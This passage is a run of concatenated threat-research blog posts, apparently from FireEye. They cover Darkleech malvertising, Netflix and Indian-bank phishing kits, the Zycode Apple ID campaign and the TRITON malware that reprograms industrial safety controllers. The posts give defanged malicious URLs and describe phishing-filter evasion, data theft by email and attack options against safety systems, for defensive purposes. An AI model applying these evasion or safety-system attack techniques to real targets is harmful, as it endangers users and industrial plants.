  attempts at shutting down the domain by constantly being on the move.</p>
 <p>
  <a href="/content/dam/legacy/blog/2013/10/GlobalCDN_PLESK.png"><img
      class="alignnone size-full wp-image-3426 landscape-lg"
      alt="GlobalCDN_PLESK"
      src="https://www.fireeye.com/content/dam/legacy/blog/2013/10/GlobalCDN_PLESK.png"
      width="806" height="261" /></a></p>
 <p>
  <b>Figure 5. – The familiar Plesk control panel, residing on the server.</b></p>
 <p>This was a widespread campaign, indirectly affecting many web sites
  via malvertising techniques. The referring hosts run the gamut from
  local radio stations to high profile news, sports, and shopping sites.
  Given the large amounts of web traffic these types of sites see, its
  not surprising there was a tidal wave of requests to
  delivery[.]globalcdnnode[.]com. Every time a page with the
  malvertisement was loaded, a request was made to
  hXXp://delivery.globalcdnnode.com/7f01baa99716452bda5bba0572c58be9/afr-zone.php,
  in the background.</p>
 <p>To give an example of what this activity looked like from DTI, you
  can see the numbers in the chart below.</p>
 <p> </p>
 <p>
  <a href="/content/dam/legacy/blog/2013/10/Darkleech_splunk.png"><img
      class="alignnone size-full wp-image-3423 landscape-sm"
      alt="Darkleech_splunk"
      src="https://www.fireeye.com/content/dam/legacy/blog/2013/10/Darkleech_splunk.png"
      width="464" height="150" /></a></p>
 <p>
  <b>Figure 6. – DTI graph showing number of Darkleech detections logged
    each day.</b></p>
 <p>By using malvertising and or posing as a legitimate advertiser or
  content delivery network, the bad guys infiltrate the web
  advertisement ecosystem. This results in their malicious content
  getting loaded in your browser, <i>often times in the background</i>,
  while you browse sites that have nothing to do with the attack (as was
  the case in our careers site).</p>
 <p>Imagine a scenario where a good portion of enterprise users have a
  home page set to <i>a popular news website</i>. More than likely, the
  main web page has advertisements, and some of those ads could be
  served from 3<sup>rd</sup> party advertiser networks and or CDNs. If
  <i>just</i> one of those advertisements on the page is malicious,
  visitors to that page are <i>at risk</i> of redirection and or
  infection, even though the news website’s server is itself clean.</p>
 <p>So, when everybody shows up to work on Monday and opens their
  browsers, there could be a wave of clients making requests to exploit
  kit landing pages, if Darkleech is lurking in those advertisement
  waters, you could end up with a leech or 2 attached to your network.</p>
http://www.fireeye.com/blog/threat-research/2013/10/another-darkleech-campaign.html2013-10-03T17:23:00.000Z2020-07-24T06:48:21.902ZCredit Card Data and Other Information Targeted in Netflix Phishing Campaignnoemail@noemail.orgMohammed Mohsin Dalla<h5>Introduction</h5>
 <p>Through FireEye’s <a
    href="/content/fireeye-www/en_US/products/email-security.html"
    target="_blank">Email Threat Prevention</a> (ETP) solution, FireEye
  Labs discovered a phishing campaign in the wild targeting the credit
  card data and other personal information of Netflix users primarily
  based in the United States.</p>
 <p>This campaign is interesting because of the evasion techniques that
  were used by the attackers:</p>
 <ul> <li>The phishing pages were hosted on legitimate, but compromised
    web servers.</li> <li>Client-side HTML code was obfuscated with AES
    encryption to evade text-based detection.</li> <li>Phishing pages
    were not displayed to users from certain IP addresses if its DNS
    resolved to companies such as Google or PhishTank.</li> </ul>
 <p>At the time of posting, the phishing websites we observed were no
  longer active.</p>
 <h5>Attack Flow</h5>
 <p>The attack seems to start with an email notification – sent by the
  attackers – that asks the user to update their Netflix membership
  details. The phishing link inside the email body directs recipients to
  a page that attempts to mimic a Netflix login page, as seen in Figure 1.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig1.png" /></p>
 <p>
  <span class="type-XS">Figure 1: Fake login page mimicking the Netflix website</span></p>
 <p>Upon submitting their credentials, victims are then directed to
  webpages requesting additional membership details (Figure 2) and
  payment information (Figure 3). These websites also attempt to mimic
  authentic Netflix webpages and appear legitimate. Once the user has
  entered their information, they are taken to the legitimate Netflix homepage.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig2.png" /></p>
 <p>
  <span class="type-XS">Figure 2: Fake webpage asking users to update
    their personal details</span></p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig3.png" /></p>
 <p>
  <span class="type-XS">Figure 3: Netflix phishing webpage used to steal
    credit card information</span></p>
 <h5>Technical Details</h5>
 <p>The phishing kit uses techniques to evade phishing filters. One
  technique is the use of AES encryption to encode the content presented
  at the client’s side, as seen in Figure 4. The purpose of using this
  technique is code obfuscation, which helps to evade text-based
  detection. By obfuscating the webpage, attackers try to deceive
  text-based classifiers and prevent them from inspecting webpage
  content. This technique employs two files, a PHP and a JavaScript file
  that have functions to encrypt and decrypt input strings. The PHP file
  is used to encrypt the webpages at the server side, as seen in Figure
  5. At the client side, the encrypted content is decoded using a
  defined function in the JavaScript file, as seen in Figure 6. Finally,
  the webpage is rendered using the ‘document.write’ function.<img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig4.png" /></p>
 <p>
  <span class="type-XS">Figure 4: Client-side code obfuscation using AES encryption</span></p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig5.png" /></p>
 <p>
  <span class="type-XS">Figure 5: PHP code used at server side for encryption</span></p>
 <p>
  <i>
    <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig6.png" /></i></p>
 <p>
  <span class="type-XS">Figure 6: JavaScript code used at client-side
    for decryption</span></p>
 <p>Another technique is the host-based evasion, as seen in Figure 7.
  The host name of organizations such as ‘phishtank’ and ‘google’ are
  blacklisted. The host name of the client is compared against a list of
  blacklisted host names. If there is a match against the blacklist, a
  “404 Not Found” error page is presented.</p>
 <p>
  <a
    href="/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig7.png"
      target="_blank"><img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig7.png" /></a></p>
 <p>
  <span class="type-XS">Figure 7: Server side code for blacklisting
    known hosts. Click image to enlarge.</span></p>
 <p>As with the majority of phishing attacks, this campaign uses PHP
  mail utility to send the attacker the stolen credentials. The
  advantage of using this technique is that the attacker can host their
  phishing kits on a number of websites and still get the stolen
  credentials and other information from a single email account. This
  enables attackers to extend their reach.</p>
 <p>
  <a
    href="/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig8a.png"
      target="_blank"><img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig8a.png" /></a></p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Credit%20card%20data%20Netflix%20Mohammed%20Dalla/Fig8b.png" /></p>
 <p>
  <span class="type-XS">Figure 8: Stolen information is sent to an email
    address using mail() function</span></p>
 <h5>Tips to Secure your Netflix Account</h5>
 <p>To learn more about securing your Netflix account, Netflix provides
  additional information on how to keep your account safe from phishing
  scams and other fraudulent activity at https://www.netflix.com/security.</p>
http://www.fireeye.com/blog/threat-research/2017/01/credit_card_dataand.html2017-01-09T16:00:00.000Z2020-07-24T06:37:29.612Z‘One-Stop Shop’ – Phishing Domain Targets Information from Customers of
Several Indian Banksnoemail@noemail.orgSanthosh Ramanchandran<p>FireEye Labs recently discovered a malicious phishing domain designed
  to steal a variety of information – including credentials and mobile
  numbers – from customers of several banks in India. Currently, we have
  not observed this domain being used in any campaigns. The phishing
  websites appear to be in the earlier stages of development and through
  this post we hope users will be able to identify these types of
  emerging threats in the future.</p>
 <p>FireEye <a
    href="/content/fireeye-www/en_US/products/email-security.html">phishing
    detection technology</a> identified a newly registered domain,
  “csecurepay[.]com”, that was registered on Oct. 23, 2016. The website
  purports to offer online payment gateway services, but is actually a
  phishing website that leads to the capturing of victim logon
  credentials – and other information – for multiple banks operating in India.</p>
 <p>Prior to publication, FireEye notified the Indian Computer Emergency
  Response Team.</p>
 <h3>Phishing Template Presentation and Techniques</h3>
 <h4>Step 1</h4>
 <p>URL: hxxp://csecurepay[.]com/load-cash-step2.aspx</p>
 <p>When navigating to the URL, the domain appears to be a payment
  gateway and requests that the user enter their bank account number and
  the amount to be transferred, as seen in Figure 1. The victim is
  allowed to choose their bank from a list that is provided.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig1.png" /></p>
 <p>
  <span class="type-XS">Figure 1: Bank information being requested</span></p>
 <p>By looking at the list, it is clear that only Indian banks are being
  targeted at this time. A total of 26 banks are available and these are
  named in the Appendix.</p>
 <h4>Step 2</h4>
 <p>URL:  hxxp://csecurepay[.]com/PaymentConfirmation.aspx</p>
 <p>The next website requests the victim to enter their valid 10-digit
  mobile number and email ID (Figure 2), which makes the website appear
  more legitimate.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig2.png" /></p>
 <p>
  <span class="type-XS">Figure 2: Personal information being requested</span></p>
 <h4>Step 3</h4>
 <p>The victim will then be redirected to the spoofed online banking
  page of the bank they selected, which requests that they log in using
  their user name and password. Figure 3 shows a fake login page for
  State Bank of India. See the Appendix for more banks that have spoofed
  login pages.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig3.png" /></p>
 <p>
  <span class="type-XS">Figure 3: Fake login page for State Bank of India</span></p>
 <p>After entering their login credentials, the victim will be asked to
  key in their One Time Password (OTP), as seen in Figure 4.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig4.png" /></p>
 <p>
  <span class="type-XS">Figure 4: OTP being requested</span></p>
 <h4>Step 4</h4>
 <p>URL: hxxp://csecurepay[.]com/Final.aspx</p>
 <p>Once all of the sensitive data is gathered, a fake failed login
  message will be displayed to the victim, as seen in Figure 5.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig5.png" /></p>
 <p>
  <span class="type-XS">Figure 5: Fake error message being displayed</span></p>
 <h4>Credit and Debit Card Phishing Website</h4>
 <p>Using the registrant information from the csecurepay domain, we
  found another domain registered by the phisher as “nsecurepay[.]com”.
  The domain, registered in latest August 2016, aims to steal credit and
  debit card information.</p>
 <p>The following are among the list of cards that are targeted:</p>
 <p>1.     ICICI Credit Card</p>
 <p>2.     ICICI Debit Card</p>
 <p>3.     Visa/Master Credit Card</p>
 <p>4.     Visa/Master Debit Card</p>
 <p>5.     SBI Debit Card Only</p>
 <p>At the time of this writing, the nsecurepay website was producing
  errors when redirecting to spoofed credit and debit card pages. Figure
  6 shows the front end.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig6.png" /></p>
 <p>
  <span class="type-XS">Figure 6: Nsecurepay front end</span></p>
 <h3>Conclusion</h3>
 <p>Phishing has its own development lifecycle. It usually starts off
  with building the tools and developing the “hooks” for luring victims
  into providing their financial information. Once the phishing website
  (or websites) is fully operational, we typically begin to see a wave
  of phishing emails pointing to it.</p>
 <p>In this case, we see that phishing websites have been crafted to
  spoof multiple banks in India. These attackers can potentially grab
  sensitive online banking information and other personal data, and even
  provided support for multifactor authentication and OTP. Moreover,
  disguising the initial presentation to appear as an online payment
  gateway service makes the phishing attack seem more legitimate.</p>
 <p>FireEye Labs detects this phishing attack and customers will be
  protected against the usage of these sites in possible future campaigns.</p>
 <h3>Appendix</h3>
 <p>Fake login pages were served for 26 banks. The following is a list
  of some of the banks:</p>
 <p>-Bank of Baroda - Corporate</p>
 <p>-Bank of Baroda - Retail</p>
 <p>-Bank of Maharashtra</p>
 <p>-HDFC Bank</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Phishing%20Indian%20banks/Fig7.png" /></p>
 <p>
  <span class="type-XS">Figure 7: HDFC Bank fake login page</span></p>
 <p>-ICICI Bank</p>
 <p>-IDBI Bank</p>
 <p>-Indian Bank</p>
 <p>-IndusInd Bank</p>
 <p>-Jammu and Kashmir Bank</p>
 <p>-Kotak Bank</p>
 <p>-Lakshmi Vilas Bank - Corporate</p>
 <p>-Lakshmi Vilas Bank - Retail</p>
 <p>-State Bank of Hyderabad</p>
 <p>-State Bank of India</p>
 <p>-State Bank of Jaipur</p>
 <p>-State Bank of Mysore</p>
 <p>-State Bank of Patiala</p>
 <p>-State Bank of Bikaner</p>
 <p>-State Bank of Travancore</p>
 <p>-Tamilnad Mercantile Bank</p>
 <p>-United Bank of India</p>
http://www.fireeye.com/blog/threat-research/2016/11/one-stop-shop-phishing-domain.html2016-11-30T17:13:00.000Z2020-07-24T06:37:29.632ZRotten Apples: Resurgencenoemail@noemail.orgDr. Fahim Abbasi<p>In June 2016, we published a <a
    href="/content/fireeye-www/en_US/blog/threat-research/2016/06/rotten_apples_apple.html"
    target="_blank">blog about a phishing campaign</a> targeting the
  Apple IDs and passwords of Chinese Apple users that emerged in the
  first quarter of 2016 (referred to as the “Zycode” phishing campaign).
  At FireEye Labs we have an automated system designed to proactively
  detect newly registered malicious domains and this system had observed
  some phishing domains that were designed to appear as legitimate Apple
  domains. Most of the domains reported by this system were suspended in
  June 2016, which resulted in a loss of momentum for the Zycode
  phishing campaign. Throughout the second quarter of 2016, the Zycode
  phishing campaign was in hibernation.</p>
 <p>We recently observed a resurgence of the same phishing campaign when
  our systems detected roughly 90 phony Apple-like domains that were
  registered from July 2016 to September 2016. Once again, Chinese Apple
  users are being targeted for their Apple IDs and passwords using the
  same content reported on in our earlier blog. The majority of these
  domains are registered in the .com TLD by email accounts from
  qq[.]com, and the IPs of these domains point to mainland China, as
  seen in Figure 1.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Fig1.png" /></p>
 <p>
  <span class="type-XS">Figure 1: Google map showing the location of the
    hosted phishing domains</span></p>
 <h5>What has not Changed?<br /> </h5>
 <p>The attackers have not changed the content of the phishing sites.
  The obfuscated JavaScript used in the earlier version is once again
  being used here in this campaign. We have provided the details of
  JavaScript and screenshots of interaction with the website in our <a
    href="https://www.fireeye.com/blog/threat-research/2016/06/rotten_apples_apple.html">earlier blog</a>.</p>
 <h5>What has Changed?</h5>
 <p>Apparently the domains and email addresses used in previous version
  of the campaign were effectively taken down. Now the attackers have
  moved to a new malicious infrastructure; new domains, IPs and email
  addresses are being used for this campaign. The new domain names for
  the campaign are listed in Table 1, while their IPs and registrant
  emails are reported in Table 2 and Table 3, respectively.</p>
 <h5>
  <b>Domains List</b></h5>
 <h5>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Tab1.png" /></h5>
 <p>
  <span class="type-XS">Table 1: Apple phishing domains serving the
    Zycode phishing kit.</span></p>
 <h5>Unique IP(s)<br /> </h5>
 <p>Table 2 shows the list of unique IPs, which are not the same as what
  was seen before.<br /> </p>
 <h1>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Tab2.png" /></h1>
 <p>
  <span class="type-XS">Table 2. IP addresses used by the domains.</span></p>
 <h5>Unique Email Addresses<br /> </h5>
 <p>The email addresses used to register these domains, showing no
  similarity with email addresses in the previous campaign, are shown in
  Table 3.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Tab3.png" /></p>
 <p>
  <span class="type-XS">Table 3. List of unique registrant emails.</span>
  <br /> </p>
 <h5>Unique Registrants<br /> </h5>
 <p>Table 4 shows the registrant names, which have no similarity with
  the previous registrant name information.</p>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/Rotten%20Apples%20Fahim%20Abbasi/Tab4.png" /></p>
 <p>
  <span class="type-XS">Table 4. List of registrant names used by the
    phishing domains.</span>
  <br /> </p>
 <h5>How to Avoid Being a Victim</h5>
 <p>Apple provides information on phishing <a
  href="http://www.apple.com/legal/more-resources/phishing/">here</a>
  and <a href="https://support.apple.com/en-us/HT204759">here</a>, and
  on iCloud security <a
  href="https://support.apple.com/en-us/HT203126">here</a>. There are
  simple ways for a user to be more secure against this and similar
  attacks. The following are a few tips:</p>
 <ul> <li>Enable <a
      href="https://support.apple.com/en-us/HT204915">two-factor
      authentication for Apple ID</a>.</li> <li>Always check the address
    bar for the correct web address.</li> <li>Avoid clicking links in
    emails and SMS messages that supposedly direct to iCloud pages.</li>
    <li>Use our <a
      href="/content/fireeye-www/en_US/products/email-security.html#content-par_grid_66_33_full_c718"
      target="_blank">FireEye EX appliance</a>, which provides effective
    detection for the Zycode phishing campaign.</li> </ul>
http://www.fireeye.com/blog/threat-research/2016/10/rotten_apples_resur.html2016-10-20T12:00:00.000Z2020-07-24T06:37:29.623ZAttackers Deploy New ICS Attack Framework “TRITON” and Cause Operational
Disruption to Critical Infrastructurenoemail@noemail.orgBlake Johnson<h4>Introduction</h4>
 <p>
  <a href="/content/fireeye-www/en_US/services.html">Mandiant</a>
  recently responded to an incident at a critical infrastructure
  organization where an attacker deployed malware designed to manipulate
  industrial safety systems. The targeted systems provided emergency
  shutdown capability for industrial processes. We assess with moderate
  confidence that the attacker was developing the capability to cause
  physical damage and inadvertently shutdown operations. This malware,
  which we call TRITON, is an attack framework built to interact with
  Triconex Safety Instrumented System (SIS) controllers. We have not
  attributed the incident to a threat actor, though we believe the
  activity is consistent with a nation state preparing for an attack.</p>
 <p>TRITON is one of a limited number of publicly identified malicious
  software families targeted at <a
    href="/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html">industrial
    control systems (ICS)</a>. It follows <a
  href="/content/fireeye-www/en_US/company/press-releases/2014/fireeye-reveals-rise-in-advanced-threat-activities-by-iranian-linked-ajax-security-team-in-post-stuxnet-era.html">Stuxnet</a>
  which was used against Iran in 2010 and Industroyer which we believe
  was deployed by Sandworm Team against Ukraine in 2016. TRITON is
  consistent with these attacks, in that it could prevent safety
  mechanisms from executing their intended function, resulting in a
  physical consequence.</p>
 <table cellspacing="0" cellpadding="0" border="1"> <tbody>
    <tr>
      <td width="90"><p>
          <b>Malware Family</b></p> </td> <td width="189"><p>
          <b>Main Modules</b></p> </td> <td width="189"><p>
          <b>Description</b></p> </td> </tr>
    <tr>
      <td rowspan="2" width="90"><p>TRITON</p> </td> <td
        width="189"><p>trilog.exe</p> </td> <td width="189"><p>Main
          executable leveraging libraries.zip</p> </td> </tr>
    <tr>
      <td width="189"><p>library.zip</p> </td> <td width="189"><p>Custom
          communication library for interaction with Triconex
        controllers.</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Table 1: Description of TRITON Malware</span></p>
 <h4>Incident Summary</h4>
 <p>The attacker gained remote access to an SIS engineering workstation
  and deployed the TRITON attack framework to reprogram the SIS
  controllers. During the incident, some SIS controllers entered a
  failed safe state, which automatically shutdown the industrial process
  and prompted the asset owner to initiate an investigation. The
  investigation found that the SIS controllers initiated a safe shutdown
  when application code between redundant processing units failed a
  validation check -- resulting in an MP diagnostic failure message.</p>
 <p>We assess with moderate confidence that the attacker inadvertently
  shutdown operations while developing the ability to cause physical
  damage for the following reasons:</p>
 <ul style="list-style-position: inside;"> <li>Modifying the SIS could
    prevent it from functioning correctly, increasing the likelihood of
    a failure that would result in physical consequences.</li>
    <li>TRITON was used to modify application memory on SIS controllers
    in the environment, which could have led to a failed validation
  check.</li> <li>The failure occurred during the time period when
    TRITON was used.</li> <li>It is not likely that existing or external
    conditions, in isolation, caused a fault during the time of the
  incident.</li> </ul>
 <h4>Attribution</h4>
 <p>
  <a href="/content/fireeye-www/en_US/index.html">FireEye</a> has not
  connected this activity to any actor we currently track; however, we
  assess with moderate confidence that the actor is sponsored by a
  nation state. The targeting of critical infrastructure as well as the
  attacker’s persistence, lack of any clear monetary goal and the
  technical resources necessary to create the attack framework suggest a
  well-resourced nation state actor.  Specifically, the following facts
  support this assessment:</p>
 <p>The attacker targeted the SIS suggesting an interest in causing a
  high-impact attack with physical consequences. This is an attack
  objective not typically seen from cyber-crime groups.</p>
 <p>The attacker deployed TRITON shortly after gaining access to the SIS
  system, indicating that they had pre-built and tested the tool which
  would require access to hardware and software that is not widely
  available. TRITON is also designed to communicate using the
  proprietary TriStation protocol which is not publicly documented
  suggesting the adversary independently reverse engineered this protocol.</p>
 <p>The targeting of critical infrastructure to disrupt, degrade, or
  destroy systems is consistent with numerous attack and reconnaissance
  activities carried out globally by Russian, Iranian, North Korean,
  U.S., and Israeli nation state actors. Intrusions of this nature do
  not necessarily indicate an immediate intent to disrupt targeted
  systems, and may be preparation for a contingency.</p>
 <h4>Background on Process Control and Safety Instrumented Systems</h4>
 <p>
  <br /> <span class="type-XS">Figure 1: ICS Reference Architecture</span></p>
 <p>Modern industrial process control and automation systems rely on a
  variety of sophisticated control systems and safety functions. These
  systems and functions are often referred to as <a
    href="/content/fireeye-www/en_US/products/industrial-systems-and-critical-infrastructure-security.html">Industrial
    Control Systems (ICS)</a> or Operational Technology (OT).</p>
 <p>A Distributed Control System (DCS) provides human operators with the
  ability to remotely monitor and control an industrial process. It is a
  computerized control system consisting of computers, software
  applications and controllers. An Engineering Workstation is a computer
  used for configuration, maintenance and diagnostics of the control
  system applications and other control system equipment.</p>
 <p>A SIS is an autonomous control system that independently monitors
  the status of the process under control. If the process exceeds the
  parameters that define a hazardous state, the SIS attempts to bring
  the process back into a safe state or automatically performs a safe
  shutdown of the process. If the SIS and DCS controls fail, the final
  line of defense is the design of the industrial facility, which
  includes mechanical protections on equipment (e.g. rupture discs),
  physical alarms, emergency response procedures and other mechanisms to
  mitigate dangerous situations.</p>
 <p>Asset owners employ varied approaches to interface their plant's DCS
  with the SIS. The traditional approach relies on the principles of
  segregation for both communication infrastructures and control
  strategies. For at least the past decade, there has been a trend
  towards integrating DCS and SIS designs for various reasons including
  lower cost, ease of use, and benefits achieved from exchanging
  information between the DCS and SIS. We believe TRITON acutely
  demonstrates the risk associated with integrated designs that allow
  bi-directional communication between DCS and SIS network hosts.</p>
 <h4>Safety Instrumented Systems Threat Model and Attack Scenarios</h4>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/triton-ics/Fig2%20HR.png" />
  <br /> <span class="type-XS">Figure 2: Temporal Relationship Between
    Cyber Security and Safety</span></p>
 <p>The attack lifecycle for disruptive attacks against ICS is similar
  to other types of cyber attacks, with a few key distinctions. First,
  the attacker’s mission is to disrupt an operational process rather
  than steal data. Second, the attacker must have performed OT
  reconnaissance and have sufficient specialized engineering knowledge
  to understand the industrial process being controlled and successfully
  manipulate it.</p>
 <p>Figure 2 represents the relationship between cyber security and
  safety controls in a process control environment. Even if cyber
  security measures fail, safety controls are designed to prevent
  physical damage. To maximize physical impact, a cyber attacker would
  also need to bypass safety controls.</p>
 <p>The SIS threat model below highlights some of the options available
  to an attacker who has successfully compromised an SIS.</p>
 <p>
  <i>Attack Option 1: Use the SIS to shutdown the process</i></p>
 <ul style="list-style-position: inside;"> <li>The attacker can
    reprogram the SIS logic to cause it to trip and shutdown a process
    that is, in actuality, in a safe state. In other words, trigger a
    false positive.</li> <li>Implication: Financial losses due to
    process downtime and complex plant start up procedure after the
  shutdown.</li> </ul>
 <p>
  <i>Attack Option 2: Reprogram the SIS to allow an unsafe state</i></p>
 <ul style="list-style-position: inside;"> <li>The attacker can
    reprogram the SIS logic to allow unsafe conditions to persist.</li>
    <li>Implication: Increased risk that a hazardous situation will
    cause physical consequences (e.g. impact to equipment, product,
    environment and human safety) due to a loss of SIS
  functionality.</li> </ul>
 <p>
  <i>Attack Option 3: Reprogram the SIS to allow an unsafe state – while
    using the DCS to create an unsafe state or hazard</i></p>
 <ul style="list-style-position: inside;"> <li>The attacker can
    manipulate the process into an unsafe state from the DCS while
    preventing the SIS from functioning appropriately.</li>
    <li>Implication: Impact to human safety, the environment, or damage
    to equipment, the extent of which depends on the physical
    constraints of the process and the plant design.</li> </ul>
 <h4>Analysis of Attacker Intent</h4>
 <p>We assess with moderate confidence that the attacker’s long-term
  objective was to develop the capability to cause a physical
  consequence. We base this on the fact that the attacker initially
  obtained a reliable foothold on the DCS and could have developed the
  capability to manipulate the process or shutdown the plant, but
  instead proceeded to compromise the SIS system. Compromising both the
  DCS and SIS system would enable the attacker to develop and carry out
  an attack that causes the maximum amount of damage allowed by the
  physical and mechanical safeguards in place.</p>
 <p>Once on the SIS network, the attacker used their pre-built TRITON
  attack framework to interact with the SIS controllers using the
  TriStation protocol. The attacker could have caused a process shutdown
  by issuing a halt command or intentionally uploading flawed code to
  the SIS controller to cause it to fail. Instead, the attacker made
  several attempts over a period of time to develop and deliver
  functioning control logic for the SIS controllers in this target
  environment. While these attempts appear to have failed due one of the
  attack scripts’ conditional checks, the attacker persisted with their
  efforts. This suggests the attacker was intent on causing a specific
  outcome beyond a process shutdown.</p>
 <p>Of note, on several occasions, we have observed evidence of long
  term intrusions into ICS which were not ultimately used to disrupt or
  disable operations. For instance, Russian operators, such as Sandworm
  Team, have compromised Western ICS over a multi-year period without
  causing a disruption.</p>
 <h4>Summary of Malware Capabilities</h4>
 <p>The TRITON attack tool was built with a number of features,
  including the ability to read and write programs, read and write
  individual functions and query the state of the SIS controller.
  However, only some of these capabilities were leveraged in the
  trilog.exe sample (e.g. the attacker did not leverage all of TRITON’s
  extensive reconnaissance capabilities).</p>
 <p>The TRITON malware contained the capability to communicate with
  Triconex SIS controllers (e.g. send specific commands such as <i>halt
  </i>or read its memory content) and remotely reprogram them with an
  attacker-defined payload. The TRITON sample Mandiant analyzed added an
  attacker-provided program to the execution table of the Triconex
  controller. This sample left legitimate programs in place, expecting
  the controller to continue operating without a fault or exception. If
  the controller failed, TRITON would attempt to return it to a running
  state. If the controller did not recover within a defined time window,
  this sample would overwrite the malicious program with invalid data to
  cover its tracks.</p>
 <h4>Recommendations</h4>
 <p>Asset owners who wish to defend against the capabilities
  demonstrated in the incident, should consider the following controls:</p>
 <ul> <li>Where technically feasible, segregate safety system networks
    from process control and information system networks. Engineering
    workstations capable of programming SIS controllers should not be
    dual-homed to any other DCS process control or information system
  network.</li> <li>Leverage hardware features that provide for physical
    control of the ability to program safety controllers. These usually
    take the form of switches controlled by a physical key. On Triconex
    controllers, keys should not be left in the PROGRAM mode other than
    during scheduled programming events.</li> <li>Implement change
    management procedures for changes to key position. Audit current key
    state regularly.</li> <li>Use a unidirectional gateway rather than
    bidirectional network connections for any applications that depend
    on the data provided by the SIS.</li> <li>Implement strict access
    control and application whitelisting on any server or workstation
    endpoints that can reach the SIS system over TCP/IP.</li>
    <li>Monitor ICS network traffic for unexpected communication flows
    and other anomalous activity.</li> </ul>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/triton-ics/Fig3.png" />
  <br /> <span class="type-XS">Figure 3: Triconex Key Switch (<a href="https://images-na.ssl-images-amazon.com/images/I/41jr93jKzML._SX466_.jpg">source</a>)</span></p>
 <h4>Appendix: Technical Analysis</h4>
 <p>
  <img src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/triton-ics/Fig4%20HR.png" />
  <br /> <span class="type-XS">Figure 4: TRITON Architecture and Attack Scenario</span></p>
 <p>TRITON was deployed on an SIS engineering workstation running the
  Microsoft Windows operating system. The malware was named to
  masquerade as the legitimate Triconex Trilog application. This
  application is used for reviewing logs and is a part of the TriStation
  application suite. The malware was delivered as a Py2EXE compiled
  python script dependent on a zip file containing standard Python
  libraries, open source libraries, as well as the attacker-developed
  Triconex attack framework for interacting with the Triconex
  controllers. Along with the executable, two binary files,
    <i>inject.bin (malicious function code)</i> and <i>imain.bin
    (malicious control logic)</i>, were deployed as the controller’s
  payload. These file names were hard coded in the Py2EXE compiled
  python script.</p>
 <p>Trilog.exe took one option from the command line, which was a single
  IP address of the target Triconex device. It did not leverage the
  underlying TRITON library’s capability for Triconex device discovery,
  instead an instance of trilog.exe had to be invoked separately for
  each target controller in the environment. Once invoked, trilog.exe
  checked the status of the controller, then read the configuration
  information exposed by the TriStation protocol. If the controller was
  in a running state, trilog.exe encoded the two payload files
  <i>inject.bin</i> and <i>imain.bin</i> and passed them to the
  communication libraries to be appended to the controller’s program
  memory and execution table.</p>
 <p>After payload files were inserted into memory on the Triconex
  controller, the script initiated a countdown, periodically checking
  the status of the controller. If an error was detected, the
  communication library’s method <i>SafeAppendProgramMod</i> attempted
  to reset the controller to the previous state using a TriStation
  protocol command. If this failed, trilog.exe attempted to write a
  small ‘dummy’ program to memory. We assess that this was an
  anti-forensics technique to hide the presence of the attacker code on
  the Triconex controller.</p>
 <p>Working with the asset owner, Mandiant ran trilog.exe in a lab
  environment with a valid Triconex controller and discovered a
  conditional check in the malware that prevented the payload binary
  from persisting in the environment. Mandiant confirmed that, after
  correcting patching the attack script to remove this check, the
  payload binary would persist in controller memory, and the controller
  would continue to run.</p>
 <p>TRITON implements the TriStation protocol, which is the protocol
  used by the legitimate TriStation application, to configure controllers.</p>
 <p>
  <i>TsHi<b> </b></i>is the high-level interface created by the
  malware’s authors that allows the threat actor’s operators to
  implement attack scripts using the TRITON framework. It exposes
  functions for both reconnaissance and attack. The functions generally
  accept binary data from the user, and handle the code ‘signing’ and
  check sums prior to passing the data to lower level libraries for
  serialization on to the network.</p>
 <p>
  <i>TsBase</i>, another attacker-written module,<i> </i>contains the
  functions called by <i>TsHi</i>, which translate the attacker’s
  intended action to the appropriate TriStation protocol function code.
  For certain functions, it also packs and pads the data in to the
  appropriate format.</p>
 <p>
